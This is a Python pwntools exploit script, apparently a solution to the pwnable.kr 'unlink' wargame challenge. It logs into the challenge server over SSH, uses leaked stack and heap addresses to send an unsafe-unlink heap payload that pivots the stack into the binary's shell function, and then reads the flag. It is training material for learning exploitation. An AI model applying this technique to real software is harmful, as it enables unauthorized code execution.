#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwnable.kr --port 2222 --user unlink --pass guest --path unlink
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'unlink')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'unlink'
password = args.PASSWORD or 'guest'
remote_path = 'unlink'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
bp 0x804924b
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

io.recvuntil(b"here is stack address leak: ")
stack_addr = int(io.recvline(), 16)

info(f"stack_addr: {hex(stack_addr)}")

ret_addr_addr = stack_addr - 24
saved_ebp_addr = ret_addr_addr - 4

info(f"ret_addr_addr: {hex(ret_addr_addr)}")

io.recvuntil(b"here is heap address leak: ")
heap_addr = int(io.recvline(), 16)

info(f"heap_addr: {hex(heap_addr)}")

payload_addr = heap_addr + 8

io.recvuntil(b"now that you have leaks, get shell!\n")

fake_esp = payload_addr + 4024

io.sendline(
    flat({
        # stack pivot: ebp -> payload_addr + 4036
        # overwrite B: fd=saved_ebp_addr, bk=payload_addr + 4028
        # saved_ebp = *(payload + 4028)
        # *(payload + 4028) = ...  # we dont really care
        0x18: p32(payload_addr + 4028),
        0x1c: p32(saved_ebp_addr),

        # fake stack, after pops we will have:
        4020: fake_esp + 4,       # saved esp
        4024: exe.sym["shell"],   # return address
    })
)

io.sendline(b"echo AAAAAAAA; cat flag")
io.recvuntil(b"AAAAAAAA\n")

success(f"flag = {term.text.bold_italic_yellow(io.recvline().strip().decode())}")
